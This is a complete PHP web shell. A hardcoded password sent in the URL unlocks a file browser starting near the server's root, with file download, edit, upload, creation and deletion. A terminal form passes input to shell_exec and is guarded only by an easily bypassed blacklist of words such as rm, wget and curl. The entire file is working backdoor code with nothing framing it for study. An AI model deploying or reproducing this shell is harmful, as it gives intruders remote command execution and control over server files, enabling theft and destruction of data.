<?php
$password = "123456";

if (!isset($_GET['auth']) || $_GET['auth'] !== $password) {
    die("Unauthorized access.");
}

$defaultPath = realpath(__DIR__ . '/../../../../../../..');
$path = isset($_GET['path']) ? realpath($_GET['path']) : $defaultPath;

if (!$path || strpos($path, $defaultPath) !== 0) {
    die("Invalid path.");
}

if (isset($_GET['delete'])) {
    $fileToDelete = realpath($_GET['delete']);
    if ($fileToDelete && strpos($fileToDelete, $defaultPath) === 0 && is_file($fileToDelete)) {
        unlink($fileToDelete);
        echo "<p style='color: red'>Deleted: {$fileToDelete}</p>";
    }
}

if (isset($_GET['download'])) {
    $fileToDownload = realpath($_GET['download']);
    if ($fileToDownload && strpos($fileToDownload, $defaultPath) === 0 && is_file($fileToDownload)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($fileToDownload) . '"');
        header('Content-Length: ' . filesize($fileToDownload));
        readfile($fileToDownload);
        exit;
    }
}

if (isset($_POST['editfile']) && isset($_POST['newcontent'])) {
    $fileToEdit = realpath($_POST['editfile']);
    if ($fileToEdit && strpos($fileToEdit, $defaultPath) === 0 && is_file($fileToEdit)) {
        file_put_contents($fileToEdit, $_POST['newcontent']);
        echo "<p style='color: green'>File updated: {$fileToEdit}</p>";
    }
}

if (isset($_POST['newfile']) && !empty($_POST['filename'])) {
    $newFile = rtrim($path, '/') . '/' . basename($_POST['filename']);
    file_put_contents($newFile, $_POST['filecontent'] ?? '');
    echo "<p style='color: green'>File created: {$newFile}</p>";
}

if (isset($_FILES['uploadedFile'])) {
    $dest = rtrim($path, '/') . '/' . basename($_FILES['uploadedFile']['name']);
    move_uploaded_file($_FILES['uploadedFile']['tmp_name'], $dest);
    echo "<p style='color: green'>File uploaded to: {$dest}</p>";
}

$files = scandir($path);
echo "<h2>Browsing: {$path}</h2>";
echo "<ul>";
foreach ($files as $file) {
    if ($file === '.') continue;
    $full = $path . '/' . $file;
    $link = "?auth={$password}&path=" . urlencode($full);

    echo "<li>";
    if (is_dir($full)) {
        echo "<a href='{$link}' style='color: blue'>[DIR] $file</a>";
    } else {
        $download = "?auth={$password}&download=" . urlencode($full);
        $edit = "?auth={$password}&edit=" . urlencode($full);
        $delete = "?auth={$password}&delete=" . urlencode($full);
        echo htmlspecialchars($file);
        echo " - <a href='{$download}'>Download</a>";
        echo " - <a href='{$edit}' style='color: orange'>Edit</a>";
        echo " - <a href='{$delete}' style='color: red' onclick=\"return confirm('Are you sure?')\">Delete</a>";
    }
    echo "</li>";
}
echo "</ul>";
?>

<hr>
<h3>Create New File</h3>
<form method="POST">
    <input type="text" name="filename" placeholder="filename.txt" required>
    <br><textarea name="filecontent" rows="5" cols="40" placeholder="File content..."></textarea>
    <br><button type="submit" name="newfile">Create File</button>
</form>

<hr>
<h3>Upload File</h3>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="uploadedFile">
    <button type="submit">Upload</button>
</form>

<?php
if (isset($_GET['edit'])) {
    $fileToEdit = realpath($_GET['edit']);
    if ($fileToEdit && strpos($fileToEdit, $defaultPath) === 0 && is_file($fileToEdit)) {
        $content = htmlspecialchars(file_get_contents($fileToEdit));
        echo "<hr><h3>Editing File: " . basename($fileToEdit) . "</h3>";
        echo "<form method='POST'>";
        echo "<input type='hidden' name='editfile' value='" . htmlspecialchars($fileToEdit) . "'>";
        echo "<textarea name='newcontent' rows='15' cols='80'>{$content}</textarea><br>";
        echo "<button type='submit'>Save Changes</button>";
        echo "</form>";
    }
}
?>

<hr>
<h3>Terminal (CMD)</h3>
<form method="POST">
    <input type="text" name="cmd" placeholder="ls -la" style="width: 500px;" required>
    <button type="submit" name="terminal">Run</button>
</form>

<?php
if (isset($_POST['terminal']) && !empty($_POST['cmd'])) {
    $cmd = $_POST['cmd'];

    $blacklist = ['rm ', 'reboot', 'shutdown', ':(){', 'mkfs', 'dd ', 'wget ', 'curl '];
    foreach ($blacklist as $danger) {
        if (stripos($cmd, $danger) !== false) {
            echo "<pre style='color:red;'>Command blocked for security.</pre>";
            exit;
        }
    }

    $output = shell_exec($cmd . ' 2>&1');
    echo "<hr><h3>Command Output</h3><pre style='background:#000;color:#0f0;padding:10px;border-radius:5px;'>$output</pre>";
}
?>


